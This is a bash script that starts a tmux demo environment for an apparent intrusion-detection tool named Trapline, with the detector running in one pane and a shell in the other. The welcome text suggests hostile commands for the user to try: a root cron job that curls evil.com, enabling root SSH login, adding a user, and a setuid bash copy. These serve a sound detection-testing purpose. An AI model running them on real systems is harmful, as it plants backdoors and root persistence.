#!/bin/bash
# Trapline Playground — tmux split-screen environment
#
# Top pane:    `trapline run` — daemon with colored console output
# Bottom pane: interactive shell for breaking things
#
# Quit: Ctrl-C top pane, Ctrl-D bottom pane. Container is --rm, gone.

CFG=/etc/trapline/trapline.yml

# Capture baseline (learning mode — current state is known-good)
trapline rebaseline --config "$CFG" 2>/dev/null
echo "Baseline captured. Starting playground..."

# Create tmux session
tmux new-session -d -s playground

# Top pane: trapline daemon with console output
tmux send-keys -t playground "trapline run --config $CFG" Enter

# Split: bottom pane gets 60%
tmux split-window -t playground -v -l 60%

# Bottom pane: welcome + shell
tmux send-keys -t playground 'clear; echo "
  TRAPLINE PLAYGROUND — break stuff, watch findings above

  Try:
    useradd -m hacker
    echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config
    echo \"* * * * * root curl evil.com\" > /etc/cron.d/bad
    python3 -m http.server 8888 &
    cp /bin/bash /usr/local/bin/x && chmod 4755 /usr/local/bin/x

  Reset:
    trapline rebaseline --config /etc/trapline/trapline.yml

  Quit: Ctrl-C top pane, then Ctrl-D here
"; ' Enter

# Focus bottom pane
tmux select-pane -t playground:.1

# Attach
exec tmux attach -t playground
